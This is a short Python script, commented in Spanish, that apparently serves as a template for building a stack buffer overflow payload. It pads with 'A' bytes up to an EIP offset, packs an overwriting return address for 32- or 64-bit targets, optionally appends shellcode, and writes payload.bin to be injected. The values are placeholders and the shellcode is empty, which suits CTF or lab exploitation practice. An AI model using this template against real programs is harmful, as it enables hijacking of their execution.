# Archivo: generate_payload.py
import struct

# CONFIGURACIÓN (estos valores son EJEMPLOS, cámbialos)
OFFSET = 64          # bytes hasta EIP (obtenido con pattern)
RET_ADDR = 0x08048400  # dirección de retorno (ej. función o gadget)
SHELLCODE = b""      # opcional: bytes de shellcode
USE_64 = False       # True si es binario de 64 bits

payload = b"A" * OFFSET
if USE_64:
    payload += struct.pack("<Q", RET_ADDR)   # 64 bits
else:
    payload += struct.pack("<I", RET_ADDR)   # 32 bits
if SHELLCODE:
    payload += SHELLCODE

with open("payload.bin", "wb") as f:
    f.write(payload)
print(f"Payload generado: {len(payload)} bytes")

# Uso: python3 generate_payload.py; luego inyecta payload.bin.

